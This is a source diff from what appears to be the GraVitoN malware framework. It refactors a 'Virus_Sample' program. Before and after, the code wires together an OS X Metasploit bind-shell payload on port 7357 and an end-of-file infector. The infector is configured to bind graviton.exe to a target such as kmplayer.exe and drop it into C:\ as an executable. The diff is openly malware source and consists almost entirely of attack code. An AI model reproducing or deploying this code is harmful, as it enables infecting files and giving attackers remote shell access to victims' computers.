@@ -31,43 +31,30 @@
 /// Path to Log File
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
-#include "../../../graviton.hpp"
-#include "../../../gvn_ai/gvn_ai_virus_sample.hpp"
-#include "../../../gvn_spread/generic/gvn_spread_endoffile.hpp"
-#include "../../../gvn_payload/osx/gvn_payload_osx32b.hpp"
-
-class My_Virus_AI : public AI_Virus_Sample
-{
-protected:
-	virtual bool initializeInternalComponents()
-	{
-		payload = new Payload_Osx32b();
-		spread = new Spread_EndOfFile();
-
-		payload->initialize(options);
-		spread->initialize(options);
-	}
-};
+#include <graviton.hpp>
+#include <ai/virus_sample.hpp>
+#include <infect/generic/endoffile.hpp>
+#include <payload/osx/msf_shell_bind_32.hpp>
 
 int main()
 {
-	cout<<"Beginning..."<<endl;
+    GraVitoN::Payload::OSX_MSF_Shell_Bind_32 pay;
+    pay.initialize(7357);
 
-	My_Virus_AI viri;
+    GraVitoN::Infect::EndOfFile infect;
+    infect.initialize(	" Decom=Win32 "
+                        " Target=decom/target.exe "
+                        " DecTarget='kmplayer.exe' "
+                        " DecTargetPath='' "
+                        " NumFiles=1 "
+                        " File1=graviton.exe "
+                        " DecFile1=graviton.exe "
+                        " DecFilePath1='C:\\' "
+                        " IsExec1=true ");
 
-	viri.initialize(
-		" PORT=7357 "
-		""
-		" Decom=Win32 "
-		" Target=decom/target.exe "
-		" DecTarget='kmplayer.exe' "
-		" DecTargetPath='' "
-		" NumFiles=1 "
-		" File1=graviton.exe "
-		" DecFile1=graviton.exe "
-		" DecFilePath1='C:\\' "
-		" IsExec1=true ");
-	viri.run();
+    GraVitoN::AI::Virus_Sample viri(pay, infect);
 
-	return 0;
+    viri.run();
+
+    return 0;
 }
